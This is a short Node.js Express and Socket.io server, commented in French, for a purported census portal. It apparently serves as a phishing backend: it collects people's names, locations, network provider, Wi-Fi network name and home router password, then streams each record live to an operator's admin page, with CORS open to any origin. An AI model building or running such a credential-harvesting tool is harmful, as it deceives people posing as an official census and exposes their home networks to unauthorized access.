/**
 * Serveur Express + Socket.io — portail de recensement.
 */
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" },
});

const PORT = process.env.PORT || 3000;
const PUBLIC = path.join(__dirname, "public");

app.use(express.json());
app.use(express.static(PUBLIC));

app.post("/api/recensement/register", (req, res) => {
  const payload = req.body || {};
  io.emit("new-registration", {
    ...payload,
    receivedAt: new Date().toISOString(),
    id: Date.now(),
  });
  res.json({ ok: true });
});

io.on("connection", (socket) => {
  socket.on("register-data", (data) => {
    const enriched = {
      ownerName: data.ownerName ?? "",
      region: data.region ?? "",
      city: data.city ?? "",
      network: data.network ?? "",
      wifiName: data.wifiName ?? "",
      boxPassword: data.boxPassword ?? "",
      submittedAt: new Date().toISOString(),
      id: Date.now() + Math.random(),
    };
    io.emit("new-registration", enriched);
  });
});

server.listen(PORT, () => {
  console.log(`Portail : http://localhost:${PORT}`);
  console.log(`Espace habilité : http://localhost:${PORT}/admin.html`);
});
